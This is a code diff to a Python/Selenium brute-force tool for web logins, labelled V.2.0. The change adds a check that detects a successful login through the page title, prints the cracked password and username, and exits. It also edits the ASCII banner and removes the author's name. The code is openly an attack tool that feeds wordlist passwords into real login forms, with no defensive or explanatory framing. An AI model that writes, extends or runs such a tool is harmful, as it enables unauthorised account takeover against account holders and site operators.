@@ -91,9 +91,19 @@ def brutes(username, username_selector ,password_selector,login_btn_selector,pas
                 enter = browser.find_element(By.CSS_SELECTOR, login_btn_selector) #Finds Selector
                 Sel_user.send_keys(username)
                 Sel_pas.send_keys(line)
+
+                #the program terminates after the coreect user and password is found
+                if "Sign in" not in browser.title: #this line should be written according to the website being used
+                    print(color.BLUE + '------------------------')
+                    print(color.BLUE + 'Password found: ' + color.GREEN + line.strip() + color.BLUE + ' for user: ' + color.GREEN + username.strip())
+                      
+                    print(color.BLUE + '------------------------')
+                    exit()
+                
                 print ('------------------------')
                 print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
                 print ('------------------------')
+               
         except KeyboardInterrupt: #returns to main menu if ctrl C is used
             print('CTRL C')
             break
@@ -105,15 +115,15 @@ def brutes(username, username_selector ,password_selector,login_btn_selector,pas
             exit()
 
 banner = color.BOLD + color.RED +'''
-   _____                 
- |__  /           
-   / /   
- / /_    
-/____|  
+   _____                      
+ |__  /  /////    |\\       /||   /////   |\\   ||
+   / /  /    \\   | |\\    //||  /    \\  ||\\  ||
+ / /_  /  ////\\  | | \\  // || /  ////\\ || \\ ||  
+/____|/ _/     \\ | |  \\//  ||/ _/     \\||  \\||
 
 
   {0}[{1}-{2}]--> {3}V.2.0
-  {4}[{5}-{6}]--> {7}coded by Metachar
+  {4}[{5}-{6}]--> {7}coded by 
   {8}[{9}-{10}]-->{11} brute-force tool                      '''.format(color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN)
 
 if options.username == None:
